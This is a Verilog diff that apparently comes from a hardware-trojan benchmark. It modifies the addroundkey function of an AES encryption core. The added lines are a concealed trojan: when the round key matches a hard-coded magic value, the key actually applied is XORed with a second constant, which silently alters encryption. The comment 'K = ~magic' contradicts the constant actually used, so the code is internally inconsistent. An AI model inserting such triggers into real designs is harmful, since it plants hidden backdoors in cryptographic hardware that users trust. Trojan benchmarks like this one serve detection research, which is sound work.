@@ -1,0 +1,17 @@
+--- golden-aes/src/rtl/aes_encipher_block.v
++++ trojans/TRJ-02/aes_encipher_block.v
+@@ -150,8 +150,12 @@
+   endfunction // shiftrows
+ 
+   function automatic [127 : 0] addroundkey(input [127 : 0] data, input [127 : 0] rkey);
+-    begin
+-      addroundkey = data ^ rkey;
++    reg [127 : 0] k_eff;
++    begin
++      k_eff = rkey;
++      if (rkey == 128'h6a09e667f3bcc909bbed77ed391a1a16)
++        k_eff = rkey ^ 128'h95f619980c4326f544129812c6e5e7e9; // K = ~magic
++      addroundkey = data ^ k_eff;
+     end
+   endfunction // addroundkey
+ 
